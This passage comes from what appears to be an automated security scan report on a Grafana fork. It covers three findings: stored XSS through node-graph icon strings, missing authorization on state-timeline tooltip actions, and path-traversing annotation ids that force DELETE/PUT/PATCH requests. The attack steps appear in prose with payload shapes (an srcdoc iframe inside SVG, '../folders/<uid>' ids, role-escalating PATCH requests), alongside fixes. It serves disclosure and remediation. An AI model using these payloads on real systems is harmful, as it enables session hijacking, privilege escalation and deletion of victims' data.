Dependency assumptions (not in checkout, taken from the recovered sources named in the evidence): @grafana/ui Icon as recovered in `6540.*.js.map`; react-inlinesvg 4.x (`provider-D8ZFleLH.mjs`) and react-from-dom as recovered in `7606.*.js.map`. CSP is off by default (established fact), so nothing blocks the inline srcdoc script.

## Evidence
1. [public/app/plugins/panel/nodeGraph/Node.tsx:162–167](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/Node.tsx#L162-L167)
   NodeContents renders `<Icon name={node.icon} size='xxxl' />` whenever `node.icon` is truthy. `node.icon` is the raw string value of the datasource-supplied `icon` field; nothing checks it against the known icon names before it is handed to the @grafana/ui Icon component.
2. [public/app/plugins/panel/nodeGraph/utils.ts:358–375](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/utils.ts#L358-L375)
   makeNodeDatum copies `nodeFields.icon?.values[index] || ''` straight into the NodeDatum. getNodeFields (lines 65-89) resolves the field purely by name (`icon`), so any frame with an `icon` string column controls this value.
3. [public/app/plugins/panel/nodeGraph/utils.ts:581–607](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/utils.ts#L581-L607)
   getNodeGraphDataFrames accepts any frame that has an `id` field (or is named nodes/edges), so an Editor does not need a tracing datasource: any query that yields `id`, `title`, `icon` string columns (Prometheus label_replace in table format, Loki label_format, SQL SELECT, TestData 'CSV content') is rendered as a nodes frame by NodeGraphPanel.tsx:27-37.
4. [public/build/6540.a30454ce5fbe65a84f5f.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/6540.a30454ce5fbe65a84f5f.js.map) (whole file)
   Recovered @grafana/ui source `packages/grafana-ui/src/components/Icon/Icon.tsx` (sourcesContent lines 98-108, 119-153): `if (!isIconName(name)) console.warn(...)` is the only check; it then calls `getIconPath(iconName, type)` and renders `<SVG src={svgPath} .../>` (react-inlinesvg). `Icon/utils.ts` lines 64-68: `getIconPath` returns `${iconRoot}${subDir}/${name}.svg` by plain string concatenation, so the untrusted name is embedded verbatim in `src`.
5. [public/build/7606.e8e4d98948a4bb1cf3bc.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/build/7606.e8e4d98948a4bb1cf3bc.js.map) (whole file)
   Recovered `node_modules/react-inlinesvg/dist/index.mjs` lines 237-248: before fetching, `else if (src.includes("<svg")) inlineSrc = src;` treats the whole src string as inline SVG markup. Lines 33-39 (`getNode`) call `convert(svgText, { nodeOnly: true })`, and `node_modules/react-from-dom/dist/index.mjs` lines 549-576 parse it with `new DOMParser().parseFromString(input, 'text/html')` and select `body > *`, so the leading `/public/build/img/icons/unicons/` text is ignored and the attacker's `<svg>` element is returned. Lines 393-401 then build React elements with `React.createElement(parseName(nodeName), parseAttributes(node), children)`; `parseAttributes` (434-483) maps attributes through `possibleStandardNames`, which includes `srcdoc: 'srcDoc'` (line 115). React therefore renders `<iframe srcDoc=...>` inside `<foreignObject>`, and the about:srcdoc document executes script in the Grafana origin.

## Impact
The attacker's script runs in the victim's Grafana origin with the victim's session cookie: it can read every API the victim can (dashboards, datasource settings, user/org/team data, service-account token creation responses) and issue state-changing requests as the victim (edit datasources and permissions, create tokens, delete dashboards when the victim is an Editor/Admin). Confidentiality and integrity of the victim's session and everything it reaches are fully compromised. Availability is limited to what the victim's account can delete or deface; the script cannot take the service down, so availability is rated LOW.

## Reproduction steps
1. An Editor saves a dashboard with a node graph panel whose query returns an `id` column and an `icon` column containing `<svg>...<foreignObject><iframe srcdoc=...>` (TestData CSV content, Prometheus label_replace, SQL literal). Any Viewer/Admin who opens the dashboard has the node rendered; react-inlinesvg treats the icon string as inline markup and React renders the iframe, executing the attacker's script in the Grafana origin with the victim's cookies. No defence (sanitizer, CSP) stands in the way; works on any default deployment. A malicious datasource reaches the same sink without any Grafana account.

## Recommended fix
1. Node.tsx renders a datasource-supplied string as an icon name without restricting it to the known icon set, violating the expectation that `Icon` receives only trusted `IconName` values. Fix criteria: The node graph must only pass values present in the icon index (e.g. `isIconName`/`availableIconsIndex`) to `Icon`, and fall back to the stat rendering otherwise. After the fix, a nodes frame whose `icon` column contains `<svg>` markup, `..`, or any non-catalogue string renders no icon and injects no DOM; the existing Node tests should include such a value.
2. The @grafana/ui `Icon` component accepts arbitrary strings, concatenates them into a `src` and forwards to react-inlinesvg, which interprets any `src` containing `<svg` as inline markup; so every caller that forwards data-derived names becomes an HTML-injection sink. Fix criteria: `Icon` must refuse to render (not merely warn) when `name` is not a known icon name, so `src` can never contain attacker text. Verify that `<Icon name={'<svg><foreignObject><iframe srcdoc=...>'} />` renders nothing and issues no fetch.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256343

---

# State timeline/status history tooltips render field actions without the canExecuteActions gate

## Details
Field actions are dashboard-authored HTTP requests (URL, method, headers, body stored in field config actions[]) that the browser of whoever clicks them executes through getBackendSrv().fetch with that user's grafana_session cookie (public/app/features/actions/utils.ts:102-134, 191-214; editor-supplied headers are forwarded verbatim at 162-171/196-198). The project gates who is offered these buttons behind PanelContext.canExecuteActions(), which setDashboardPanelContext.ts:205-208 binds to DashboardScene.canEditDashboard() = !isSnapshot && !isEmbedded && (canEdit || canMakeEditable || config.viewersCanEdit) (DashboardScene.tsx:1226-1231; legacy DashboardModel.ts:1188-1194). Every other action-capable panel applies it: TimeSeriesTooltip.tsx:113, XYChartTooltip.tsx:135, HeatmapTooltip.tsx:327, AnnotationMarker.tsx:97, table/hooks.ts:39, canvas runtime/element.tsx:651/915, with tests asserting that getFieldActions is not called when the gate is false.

StateTimelineTooltip.tsx does not. StateTimelinePanel.tsx:63/163 and StatusHistoryPanel.tsx:65/184 compute userCanExecuteActions from the context and pass it as a prop, but the tooltip's destructuring (lines 25-39) omits canExecuteActions, and at lines 78-95, whenever the tooltip is pinned (a click on the chart) or a one-click link exists, it calls getFieldActions(series, field, replaceVariables, dataIdx, visualizationType) (status-history/utils.ts:4-38 -> getActions) and renders the result as ActionButtons through VizTooltipFooter. Field state (and so field.state.scopedVars, which getFieldActions requires) survives prepareTimelineFields (TimelineChart/utils.ts:441 spreads the field) and the GraphNG join (joinDataFrames copies state), and both panels register FieldConfigProperty.Actions (state-timeline/module.tsx:39, status-history/module.tsx:26); the docs list both as action-capable visualizations (docs/sources/visualizations/panels-visualizations/configure-data-links/index.md:182-195). The recovered @grafana/ui ActionButton (public/build/6540.a30454ce5fbe65a84f5f.js.map, packages/grafana-ui/src/components/Actions/ActionButton.tsx:32-77) shows a ConfirmModal whose body is the author-written action.confirmation text, then calls action.onClick.

What the gap hands the author beyond the project's concession: the gate deliberately offers actions only to users who could themselves edit the dashboard (co-Editors, Org/Server Admins), so forced requests against those victims are the design (and the subject of field-actions-unvalidated-method-forced-authenticated-request). This path additionally reaches (1) every user without edit permission on the dashboard - Viewers, and Editor-role users whose folder/dashboard permission here is view-only but who administer other folders, datasources or organisations; because action headers pass through verbatim, an X-Grafana-Org-Id header (documented in docs/sources/developer-resources/api-reference/http-api/authentication.md:91-101) retargets the request at another org where the victim holds a higher role; (2) everyone viewing a snapshot (isSnapshot => canEditDashboard() false): trimDashboardForSnapshot (transformSceneToSaveModel.ts:1002-1068) keeps fieldConfig, so actions travel into the snapshot; POST /api/snapshots takes an arbitrary dashboard payload (public/api-merged.json createDashboardSnapshot, 'you have to provide the full dashboard payload'), so whoever holds snapshots:create can author an action-bearing state-timeline panel without any dashboard edit right - if the deployment grants snapshots:create to Viewers, a Viewer becomes the attacker and Admins opening the snapshot link the victims; (3) embedded dashboards (SoloPanelPage.tsx:37, EmbeddedDashboard.tsx:23 set DashboardRoutes.Embedded -> meta.isEmbedded).

Attack: an Editor adds a field action to a state-timeline or status-history panel (title and confirmation text of their choosing), optionally sets method/headers in the panel JSON, and shares the dashboard or a snapshot link. A Viewer (or any non-editing user) opens it, clicks a state to pin the tooltip, clicks the action button and confirms; their browser sends the author's request with the victim's cookie - e.g. with the unvalidated method confirmed in this tree, PATCH /api/org/users/<editorId> {"role":"Admin"} plus X-Grafana-Org-Id: <org where the victim is Admin>, or DELETE /api/datasources/uid/<uid>; with GET only, any same-origin GET or a request to an author-chosen host carrying interpolated ${__user.*}/${__data.*} values.

Assumptions (no Go source in the checkout): the server honours X-Grafana-Org-Id on cookie-authenticated requests as documented and accepts same-origin requests carrying the session cookie; @grafana/ui VizTooltipFooter/ActionButton behave as recovered from the source map; snapshots:create membership in the Viewer basic role is not settled by the checkout's docs and is stated as a condition for the Viewer-as-attacker variant.

## Evidence
1. [public/app/plugins/panel/state-timeline/StateTimelineTooltip.tsx:78–95](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/state-timeline/StateTimelineTooltip.tsx#L78-L95)
   When the tooltip is pinned, getFieldActions(series, field, replaceVariables, dataIdx, visualizationType) is called unconditionally and its result is rendered as ActionButtons in VizTooltipFooter. The canExecuteActions prop (inherited from TimeSeriesTooltipProps and passed by both callers) is never read; the destructuring at lines 25-39 omits it. This is the code the fix must change.
2. [public/app/plugins/panel/timeseries/TimeSeriesTooltip.tsx:110–115](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/TimeSeriesTooltip.tsx#L110-L115)
   The sibling tooltip this one copies implements the intended protection: actions = canExecuteActions ? getFieldActions(...) : []. XYChartTooltip.tsx:135, HeatmapTooltip.tsx:327 and AnnotationMarker.tsx:97 do the same; only the state-timeline tooltip omits it.
3. [public/app/plugins/panel/state-timeline/StateTimelinePanel.tsx:63](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/state-timeline/StateTimelinePanel.tsx#L63)
   The panel computes userCanExecuteActions from PanelContext.canExecuteActions() and passes it (line 163) to the tooltip, showing the maintainers intend the gate to apply; the value is dropped on the floor.
4. [public/app/plugins/panel/status-history/StatusHistoryPanel.tsx:65](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/status-history/StatusHistoryPanel.tsx#L65)
   Status history reuses StateTimelineTooltip (import at line 24, render at 170-185, canExecuteActions passed at 184), so the same ungated path exists in a second panel type.
5. [public/app/plugins/panel/status-history/utils.ts:4–37](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/status-history/utils.ts#L4-L37)
   getFieldActions builds ActionModels from field.config.actions via getActions whenever field.state.scopedVars is set (which applyFieldOverrides sets for every rendered field, snapshots included); it performs no authorization check of its own, relying on callers to gate.
6. [public/app/features/dashboard-scene/scene/DashboardScene.tsx:1226–1231](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/DashboardScene.tsx#L1226-L1231)
   canEditDashboard() — the value behind PanelContext.canExecuteActions (setDashboardPanelContext.ts:205-208) — is false for Viewers who cannot edit, for snapshot views (isSnapshot) and for embedded dashboards (isEmbedded). These are exactly the users/contexts the missing check now exposes.
7. [public/app/features/actions/utils.ts:102–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/actions/utils.ts#L102-L133)
   ActionModel.onClick builds the Editor-authored request (URL, method, headers, body from field config, variables interpolated) and sends it with getBackendSrv().fetch, i.e. with the clicking user's grafana_session cookie and same-origin Origin header. Editor-supplied headers (lines 162-171, 196-198) pass through, so X-Grafana-Org-Id can retarget the request at another org where the victim holds a higher role.
8. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts:1002–1069](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts#L1002-L1069)
   trimDashboardForSnapshot strips panel links, annotation queries and variable queries but leaves fieldConfig (including defaults.actions / override actions) intact, so a snapshot carries the Editor's actions into a context where canEditDashboard() is always false and only this tooltip still renders them.

## Impact
The forged request is blind (response discarded) but carries the victim's full authority wherever it is sent. The newly reachable victims are precisely those the gate was meant to protect: Viewers who are Admins of another organisation (X-Grafana-Org-Id header forwarded verbatim), Server Admins holding a Viewer org role, and view-only Editors who administer other folders/datasources. Combined with the unvalidated DELETE/PATCH method confirmed in this tree, one confirmed click lets the author PATCH their own role to Admin in the victim's org (full read/write there: confidentiality and integrity) or DELETE datasources, folders, dashboards, users and role bindings the victim controls (integrity, availability). Impact stays within the Grafana instance.

## Reproduction steps
1. Attacker: authenticated Editor (threat-model adversary 3, 'forced requests via panel actions') using the standard Add action editor on a state-timeline or status-history panel, optionally editing panel JSON for method/headers; or, where snapshots:create is granted to Viewers, a Viewer posting a crafted snapshot payload. Default configuration suffices (actions are a standard field-config property, no feature toggle, actions_allow_post_url irrelevant to GET/DELETE/PATCH). Victim: a user who cannot edit the dashboard (Viewer, view-only Editor, anyone on a snapshot or embedded view) opens it, clicks a state to pin the tooltip, clicks the action button and accepts the author-written confirmation dialog - conscious steps, hence ACTIVE. No security mechanism must be defeated in the browser: the gate that every sibling applies is simply absent here.

## Recommended fix
1. StateTimelineTooltip renders field actions for every pinned tooltip without consulting the canExecuteActions prop its callers pass, so the dashboard-level authorization decision (canEditDashboard: not a snapshot/embed, user can edit) is bypassed for state-timeline and status-history panels. Fix criteria: Actions must only be computed and rendered when the panel context grants canExecuteActions, matching TimeSeriesTooltip. Verify: as a Viewer, in a snapshot view and in an embedded dashboard, a pinned state-timeline/status-history tooltip shows no action buttons; as an Editor on an editable dashboard it still does. Regression tests mirroring XYChartTooltip's canExecuteActions tests must cover both panels.
2. The authorization gate is re-implemented per panel/tooltip at each call site of getFieldActions/getActions, so any new or copied call site silently ships without it. Fix criteria: The gate must be enforced once, centrally, where ActionModels are built or where ActionButton/VizTooltipFooter renders them, so that a call site that omits the check cannot produce clickable actions. Verify: with canExecuteActions false, no ActionModel is produced by getActions for any visualization type.

---
**Severity:** HIGH
**Status:** Open
**Category:** Missing authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256306

---

# Dashboard/datasource-controlled annotation id interpolated into DELETE/PUT/PATCH path enables forced same-origin requests with the victim's privileges

## Details
Annotation markers rendered on time-series-style panels can be edited or deleted by any user holding the dashboard's annotation edit/delete permission, and the frontend uses the marker's `id` as a raw URL path segment when it performs the update or delete. That `id` is not server-assigned in general: `getAnnotationsFromData` (public/app/features/annotations/standardAnnotationSupport.ts:144-176, 206-217, 241-266; identical copy in @grafana/scenes recovered from public/build/7606.e8e4d98948a4bb1cf3bc.js.map) maps any datasource frame column named `id` / `dashboardUID` into the AnnotationEvent and, for every one of those keys, also honours the dashboard-authored `mappings` (source Field renames the column; source Text stamps a constant). The scenes AnnotationsDataLayer then builds the annotation frame with arrayToDataFrame(events, getLikelyAnnotationEventFieldNames(events)), which keeps every key; `AnnotationsPlugin.getVals` copies the fields into `annoVals`; and `getAnnotationTooltip` enables the pencil/trash buttons whenever `id` is truthy, `dashboardUID` is defined and the viewer has `annotationsPermissions.dashboard.canEdit/canDelete` (setDashboardPanelContext.ts:48-65 never checks the annotation's source).

When the victim clicks delete, `onAnnotationDelete(id)` -> `annotationServer().delete({id})` -> by default `LegacyAnnotationServer.delete` -> `getBackendSrv().delete(`/api/annotations/${annotation.id}`)` (annotations/api.ts:40-42; the k8s client is used only when the `grafana.kubernetesAnnotationsClient` flag is on and the group is registered, default false) or, flag on, `annotationK8sClient.remove(id)` -> `toK8sName` (pass-through for non-numeric strings) -> `ScopedResourceClient.delete` -> `getBackendSrv().delete(`/apis/annotation.grafana.app/v0alpha1/namespaces/<ns>/annotations/${id}`)` (apiserver/client.ts:162-166). Neither path validates or encodes the id; backend_srv strips only a leading '/', does not set validatePath, and fetch() applies WHATWG dot-segment removal against <base href="[[.AppSubUrl]]/">. An id of `../folders/<uid>` (legacy) or `../../../../../../api/folders/<uid>` (k8s) therefore becomes `DELETE <appSubUrl>/api/folders/<uid>` sent with the victim's grafana_session cookie, same-origin Origin header and X-Grafana-Org-Id; `?` and `#` are also unencoded so query strings can be appended. The edit flow has the same sink: AnnotationEditor.onSubmit passes `id: annoVals.id[idx]` to `onAnnotationUpdate`, which calls `annotationServer().update(anno)` -> legacy `PUT /api/annotations/${id}` with the annotation object, or k8s PATCH `.../annotations/${toK8sName(event.id)}` with a merge-patch body.

Attack: an Editor who can save a dashboard adds (or edits) an annotation query against any datasource with standard annotation support and either (a) sets `mappings: { id: {source:'text', value:'../folders/<uid>'}, dashboardUID: {source:'text', value:'x'}, text: {source:'text', value:'…'} }` in the dashboard JSON model, so every row of any query result with a time field carries the traversal id, or (b) authors the frame directly (TestData csv_content / raw_frame when a TestData instance exists, a SQL query selecting `… AS id, … AS dashboardUID`), or (c) is a malicious upstream datasource (threat-model adversary 4) returning such columns. The annotation renders as an ordinary marker. A victim with annotation delete rights on that dashboard — Editors and org Admins by default (basic_editor includes fixed:annotations:writer) — opens the marker tooltip and clicks the trash icon (routine housekeeping of a stray annotation), or edits it and clicks Save. The browser issues the attacker-chosen DELETE (or PUT/PATCH) with the victim's privileges. Reachable targets from public/api-merged.json include DELETE /api/folders/{uid} (recursive), /api/dashboards/uid/{uid}, /api/datasources/uid/{uid}, /api/admin/users/{id}, /api/orgs/{id}, /api/teams/{id}, /api/serviceaccounts/{id}, /api/access-control/teams/{id}/roles/{roleUID}, plus every k8s `/apis/.../<resource>/<name>` DELETE. The response is discarded; this is a forced-action (write) primitive that lets an Editor spend an Admin's or Server Admin's delete authority.

Assumptions (Go server not in checkout): the CSRF middleware accepts same-origin requests (standard Origin/Referer check), the DELETE/PUT handlers act with the session's privileges as the API spec documents, and TestData's csv_content backend scenario names fields from the CSV header as its documentation states. Dependency assumptions: @grafana/scenes (pinned version in the bundle) processes annotation events as the recovered standardAnnotationsSupport.js / AnnotationsDataLayer.js show. Root cause: the annotation client layer (legacy `annotations/api.ts`, `annotation/v0alpha1/index.ts`, `apiserver/client.ts`) trusts a dashboard/datasource-supplied identifier as a URL path segment, and the tooltip permission gate does not restrict edit/delete to annotations returned by Grafana's own annotation API. Same weakness class as dashboard-import-uid-path-injection-forced-put but a different source (annotation frame / mappings), different sinks (DELETE/PUT/PATCH) and a default-reachable path.

## Evidence
1. [public/app/features/annotations/api.ts:36–42](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/annotations/api.ts#L36-L42)
   Default-path sink. LegacyAnnotationServer.update/delete interpolate annotation.id verbatim into `/api/annotations/${annotation.id}` for PUT and DELETE. K8sAnnotationServer dispatches here whenever isK8sAnnotationsClientEnabled() is false, which is the default (getBooleanValue(FlagKeys.GrafanaKubernetesAnnotationsClient, false), lines 63-68). An id of `../folders/<uid>` therefore becomes DELETE <appSubUrl>/api/folders/<uid>.
2. [public/app/api/clients/annotation/v0alpha1/index.ts:204–206](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/api/clients/annotation/v0alpha1/index.ts#L204-L206)
   Flag-on sink. annotationK8sClient.remove(name) passes toK8sName(name) to ScopedResourceClient.delete. toK8sName (67-73) returns any non-numeric string unchanged, so `../../../../../../api/folders/<uid>` reaches the URL builder verbatim; nothing validates it against the k8s name grammar or URL-encodes it.
3. [public/app/api/clients/annotation/v0alpha1/index.ts:176–201](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/api/clients/annotation/v0alpha1/index.ts#L176-L201)
   update(event) builds the PATCH URL by string interpolation of toK8sName(event.id) and sends a merge-patch body {spec:{text,time,timeEnd,tags,scopes,...}} to it: the same unvalidated id gives a forced PATCH sink when the flag is on.
4. [public/app/features/apiserver/client.ts:162–165](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/apiserver/client.ts#L162-L165)
   ScopedResourceClient.delete issues getBackendSrv().delete(`${this.url}/${name}`) with the raw name. this.url is /apis/annotation.grafana.app/v0alpha1/namespaces/<ns>/annotations (six segments), so six dot-segments retarget the DELETE to any path under the Grafana origin.
5. [public/app/features/annotations/standardAnnotationSupport.ts:144–176](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/annotations/standardAnnotationSupport.ts#L144-L176)
   The standard frame-to-AnnotationEvent field list includes `id` (145) and `dashboardUID` (175); any datasource whose annotation query returns a frame with columns matching these names (case-insensitive, via getFieldDisplayName) produces events carrying attacker-chosen id and dashboardUID. @grafana/scenes' AnnotationsDataLayer uses an identical copy (recovered from public/build/7606.e8e4d98948a4bb1cf3bc.js.map, standardAnnotationsSupport.js) and its processEvents builds the frame with arrayToDataFrame(events, getLikelyAnnotationEventFieldNames(events)), which keeps every key.
6. [public/app/features/annotations/standardAnnotationSupport.ts:206–217](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/annotations/standardAnnotationSupport.ts#L206-L217)
   Per-key mappings from the dashboard-authored AnnotationQuery (`mappings`) are honoured for every key in alertEventAndAnnotationFields, including id and dashboardUID: source Text sets the value to the mapping's constant (`setter.text = opt.value`), source Field renames the column. An Editor therefore needs no crafted datasource at all: `mappings: { id: {source:'text', value:'../folders/<uid>'}, dashboardUID: {source:'text', value:'x'} }` in the dashboard JSON stamps the traversal id onto every row of any annotation query result that has a time field (text can also be a Text mapping, so hasText is satisfied).
7. [public/app/features/dashboard-scene/serialization/transformSaveModelToScene.ts:313–320](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSaveModelToScene.ts#L313-L320)
   Each dashboard JSON annotations.list entry (target and mappings as saved by the Editor) becomes a DashboardAnnotationsDataLayer whose query feeds @grafana/scenes executeAnnotationQuery -> processor.processEvents(annotation, data) = getAnnotationsFromData(data, annotation.mappings) for every datasource with `annotations` support that is not in the legacy-runner list.
8. [public/app/plugins/panel/timeseries/plugins/AnnotationsPlugin.tsx:54–62](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/AnnotationsPlugin.tsx#L54-L62)
   getVals copies every field of the annotation DataFrame into annoVals by field name, so frame fields named `id` and `dashboardUID` become annoVals.id / annoVals.dashboardUID with their raw values (strings included; the NullableNumber[] type is not enforced).
9. [public/app/plugins/panel/timeseries/plugins/annotations/getAnnotationTooltip.tsx:20–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/annotations/getAnnotationTooltip.tsx#L20-L56)
   canDelete is true whenever the row has a truthy id and a defined dashboardUID value and canDeleteAnnotations() returns true; onDelete calls onAnnotationDelete(annoId) with the row's raw id (line 55). AnnotationTooltipHeader.tsx:77-82 renders the trash IconButton whenever canDelete. Nothing checks that the row came from Grafana's own annotation store.
10. [public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts:48–64](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts#L48-L64)
   canEditAnnotations/canDeleteAnnotations ignore their dashboardUID argument and return only the dashboard's annotationsPermissions.dashboard.canEdit/canDelete (the viewer's own grant), so any annotation row with an id is offered for edit/delete to Editors and Admins (basic_editor includes fixed:annotations:writer).
11. [public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts:88–115](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts#L88-L115)
   onAnnotationUpdate forwards event.id into annotationServer().update(anno) and onAnnotationDelete(id) calls annotationServer().delete({ id }); the id is taken from the rendered annotation row, unvalidated.
12. [public/app/plugins/panel/timeseries/plugins/annotations/AnnotationEditor.tsx:70–77](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/timeseries/plugins/annotations/AnnotationEditor.tsx#L70-L77)
   Edit flow: onSubmit passes `id: annoVals.id?.[annoIdx]` to onAnnotationUpdate, so clicking Save in the pencil editor drives the PUT /api/annotations/<id> (or PATCH) sink with the same attacker-chosen id.
13. [public/app/core/services/backend\_srv.ts:596–605](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L596-L605)
   delete()/patch()/put() forward to request() without setting validatePath; parseRequestOptions (294-327) only strips a leading '/' and adds X-Grafana-Org-Id, and parseUrlFromOptions (core/utils/fetch.ts:179-190) applies validatePath only when the caller asks. The relative URL with dot-segments is resolved by fetch() against <base href="[[.AppSubUrl]]/"> (public/views/index.html:15) with the victim's same-origin cookie.
14. [public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts:51–67](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/grafana-testdata-datasource/datasource.ts#L51-L67)
   One concrete authoring option when a TestData datasource instance exists: prepareAnnotation keeps any scenarioId already set, and StandardAnnotationQueryEditor mounts TestData's regular QueryEditor (with its Scenario select), so an Editor can run csv_content (docs: first CSV row is the header) with columns time,text,id,dashboardUID and author the exact frame. SQL datasources (SELECT ... AS id, ... AS dashboardUID) and a malicious upstream (threat-model adversary 4) are equivalent sources.

## Impact
The attacker fully selects the request path (and query string) of a DELETE, PUT or PATCH that runs with the victim's authority: an Admin victim deletes folders (cascading to contained dashboards, alert rules and library panels), dashboards, datasources, teams, service accounts or RBAC assignments of the attacker's choosing, a Server Admin victim deletes users or orgs — attacker-directed destruction of protected objects the Editor could not touch (integrity HIGH). Removing datasources/folders degrades service for other users (availability LOW). The response is not readable and no data is disclosed (confidentiality NONE).

## Reproduction steps
1. Attacker: authenticated Editor (threat-model adversary 3) saving a dashboard; the only requirement beyond dashboard edit rights is an annotation query against any datasource with standard annotation support (Text-source mappings in the dashboard JSON make the datasource's content irrelevant beyond a time field), or a compromised datasource (adversary 4). No feature toggle is needed: the legacy /api/annotations/<id> sink is the default and the k8s sink is equivalent when enabled. Victim: a user holding annotations:delete or annotations:write on that dashboard — Editors and org Admins by default — who opens the marker tooltip and clicks the trash icon or saves an edit: deliberate but routine steps, UI:A. No defensive mechanism intervenes: no id validation, no URL encoding, no validatePath, no source check; the browser sends the session cookie and a same-origin Origin header.

## Recommended fix
1. LegacyAnnotationServer.update/delete, annotationK8sClient.update/remove and ScopedResourceClient.get/subresource/update/delete interpolate the annotation id (k8s name) into the request path without validating it as a single path segment or URL-encoding it, so a dashboard- or datasource-supplied id redirects the DELETE/PUT/PATCH to an arbitrary same-origin endpoint. Fix criteria: Before any request is built, the annotation id must be validated as a legacy numeric id or a k8s object name (ASCII alphanumerics, '-', '_', '.', no '..', '/', '?', '#', bounded length) or be URL-encoded with encodeURIComponent; ScopedResourceClient must do the same for every name. Verification: an annotation whose id is `../../../../../../api/folders/x` or `../folders/x` produces a validation error and no DELETE/PUT/PATCH leaves the browser; a legitimate id still resolves to /apis/.../annotations/<id> or /api/annotations/<id>.
2. The annotation tooltip/editor offers edit and delete for any annotation row whose frame carries truthy id and dashboardUID values, regardless of whether the event originated from Grafana's built-in annotation store, so datasource-authored rows and dashboard-authored Text mappings are treated as deletable Grafana annotations. Fix criteria: canEdit/canDelete must additionally require that the annotation's source is the built-in Grafana annotation datasource (or that the id was returned by Grafana's own annotation API), not an arbitrary datasource frame or a mapping constant; the standard mapper should not allow `id`/`dashboardUID` to be set from Text mappings. Verification: annotations produced by TestData csv_content, a SQL query or a Text-mapped id show no edit/delete controls even for users with annotation write/delete permissions, while built-in annotations remain editable.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site request forgery
**CWE:** [CWE-99](https://cwe.mitre.org/data/definitions/99.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
